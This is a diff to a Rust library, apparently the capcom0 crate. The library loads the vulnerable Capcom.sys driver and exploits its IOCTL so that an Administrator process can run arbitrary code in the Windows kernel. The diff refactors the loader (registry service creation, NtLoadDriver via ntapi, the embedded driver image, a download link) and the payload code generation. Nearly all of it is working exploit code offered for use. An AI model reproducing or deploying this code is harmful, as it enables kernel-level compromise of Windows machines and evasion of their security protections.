@@ -8,7 +8,7 @@ The Capcom driver enables ordinary Administrator applications to gain kernel lev
 ```rust, no_run
 fn main() {
 	// Easy setup to load the driver and open its device handle.
-	let result = capcom0::setup(|device| {
+	let result = capcom0::setup(|_driver, device| {
 		let mut success = false;
 		// This unsafe is an understatement :)
 		unsafe {
@@ -22,12 +22,10 @@ fn main() {
 	assert_eq!(result, Ok(true));
 }
 ```
-*/
+ */
 
 // Only available to 64-bit windows targets.
 #![cfg(all(windows, target_pointer_width = "64"))]
-
-extern crate winapi;
 
 use std::{error, fmt, mem, ptr};
 use std::cell::{Cell};
@@ -42,10 +40,11 @@ use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
 use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
 use winapi::um::ioapiset::{DeviceIoControl};
 use winapi::um::processenv::{GetCurrentDirectoryW};
-use winapi::um::libloaderapi::{GetProcAddress, GetModuleHandleW};
 use winapi::shared::minwindef::{HKEY, BYTE, FALSE, LPVOID, LPCVOID, DWORD};
 use winapi::shared::winerror::{ERROR_FILE_NOT_FOUND, ERROR_SUCCESS};
 use winapi::shared::ntdef::{UNICODE_STRING, PUNICODE_STRING, PVOID};
+
+use ntapi::ntioapi::{NtLoadDriver, NtUnloadDriver};
 
 //----------------------------------------------------------------
 
@@ -186,7 +185,7 @@ impl fmt::Display for Error {
 ///
 /// ```no_run
 /// // Easy setup to load the driver and open its device handle
-/// let result = capcom0::setup(|device| {
+/// let result = capcom0::setup(|_driver, device| {
 /// 	let mut success = false;
 /// 	// This unsafe is an understatement :)
 /// 	unsafe {
@@ -200,7 +199,7 @@ impl fmt::Display for Error {
 /// assert_eq!(result, Ok(true));
 /// ```
 #[inline(never)]
-pub fn setup<T, F: FnMut(&Device) -> T>(mut f: F) -> Result<T, Error> {
+pub fn setup<T, F: FnMut(&Driver, &Device) -> T>(mut f: F) -> Result<T, Error> {
 	// Require driver loading privileges to continue
 	if !enable_privileges() {
 		return Err(Error::EnablePrivileges);
@@ -255,7 +254,7 @@ pub fn setup<T, F: FnMut(&Device) -> T>(mut f: F) -> Result<T, Error> {
 									}
 									// Open the Capcom device and invoke the closure
 									Device::open()
-										.map(|device| f(&device))
+										.map(|device| f(&driver, &device))
 										.map_err(|err| Error::DeviceOpen(err))
 								},
 							}
@@ -374,12 +373,17 @@ pub struct Driver {
 	native_path: Box<[u16]>,
 }
 impl Driver {
-	// Rustdoc includes all the bytes in the documentation...
-	#[doc(hidden)]
 	/// The Capcom.sys driver image.
+	/// The returned slice has alignment of 16.
 	///
 	/// Download [the binary image here](https://github.com/CasualX/capcom0/raw/4f7b101dc680255b7a5fbd340552bbcd28f38854/driver/Capcom.sys).
-	pub const IMAGE: &'static [u8; 0x2950] = &include!("capcom.rs");
+	#[inline(never)]
+	pub fn image() -> &'static [u8; 0x2950] {
+		#[repr(align(16))]
+		struct Align16<T>(T);
+		static IMAGE: Align16<[u8; 0x2950]> = Align16(include!("capcom.rs"));
+		&IMAGE.0
+	}
 
 	/// The full NT service path.
 	///
@@ -416,6 +420,18 @@ impl Driver {
 	pub fn path(&self) -> &[u16] {
 		let len = self.native_path.len();
 		unsafe { self.native_path.get_unchecked(4..len - 1) }
+	}
+	/// The file name of the driver.
+	#[inline]
+	pub fn file_name(&self) -> &[u16] {
+		let len = self.native_path.len();
+		let mut slash = 0;
+		for i in 0..len {
+			if self.native_path[i] == '\\' as u16 {
+				slash = i;
+			}
+		}
+		unsafe { self.native_path.get_unchecked(slash + 1..len - 1) }
 	}
 
 	/// Creates a new Driver instance.
@@ -528,7 +544,8 @@ impl Driver {
 				defer! { CloseHandle(handle); }
 				// Write the driver contents
 				let mut bytes_written = mem::uninitialized();
-				if WriteFile(handle, Self::IMAGE.as_ptr() as LPCVOID, Self::IMAGE.len() as DWORD, &mut bytes_written, ptr::null_mut()) != FALSE {
+				let image = Self::image();
+				if WriteFile(handle, image.as_ptr() as LPCVOID, image.len() as DWORD, &mut bytes_written, ptr::null_mut()) != FALSE {
 					return Ok(());
 				}
 			}
@@ -727,7 +744,7 @@ impl Device {
 	}
 
 	/// Generate the payload code.
-	pub fn codegen(&self, user_fn: usize, user_data: usize) {
+	fn codegen(&self, user_fn: usize, user_data: usize) {
 		unsafe {
 			let payload = self.payload;
 
@@ -753,7 +770,7 @@ impl Device {
 	/// Invokes the Capcom IOCTL.
 	///
 	/// Ensure the payload is generated before invoking the IOCTL.
-	pub unsafe fn ioctl(&self) -> bool {
+	unsafe fn ioctl(&self) -> bool {
 		let mut payload = self.payload.offset(8);
 		let mut result = 0;
 
@@ -799,24 +816,10 @@ mod lit {
 	pub static NT_SERVICES_PATH: [u16; 63] = /*\Registry\Machine\System\CurrentControlSet\Services\Htsysm72FB*/[92u16, 82, 101, 103, 105, 115, 116, 114, 121, 92, 77, 97, 99, 104, 105, 110, 101, 92, 83, 121, 115, 116, 101, 109, 92, 67, 117, 114, 114, 101, 110, 116, 67, 111, 110, 116, 114, 111, 108, 83, 101, 116, 92, 83, 101, 114, 118, 105, 99, 101, 115, 92, 72, 116, 115, 121, 115, 109, 55, 50, 70, 66, 0];
 	pub static SLASH_CAPCOM_SYS: [u16; 12] = /*\Capcom.sys*/[92u16, 67, 97, 112, 99, 111, 109, 46, 115, 121, 115, 0];
 	pub static RECOVER_FILE_NAME: [u16; 8] = /*RECOVER*/[82u16, 69, 67, 79, 86, 69, 82, 0];
-	pub static NTDLL: [u16; 6] = /*NTDLL*/[78u16, 84, 68, 76, 76, 0];
 }
 use self::lit::*;
 
 //----------------------------------------------------------------
-
-#[allow(non_snake_case)]
-unsafe fn NtLoadDriver(DriverServiceName: PUNICODE_STRING) -> i32 {
-	let NtLoadDriver: unsafe extern "system" fn(*mut UNICODE_STRING) -> i32 =
-		mem::transmute(GetProcAddress(GetModuleHandleW(NTDLL.as_ptr()), "NtLoadDriver\0".as_ptr() as _));
-	NtLoadDriver(DriverServiceName)
-}
-#[allow(non_snake_case)]
-unsafe fn NtUnloadDriver(DriverServiceName: PUNICODE_STRING) -> i32 {
-	let NtUnloadDriver: unsafe extern "system" fn(*mut UNICODE_STRING) -> i32 =
-		mem::transmute(GetProcAddress(GetModuleHandleW(NTDLL.as_ptr()), "NtUnloadDriver\0".as_ptr() as _));
-	NtUnloadDriver(DriverServiceName)
-}
 
 #[inline]
 unsafe fn reg_set_sz(key: HKEY, sub_key: &[u16], sz: &[u16]) {
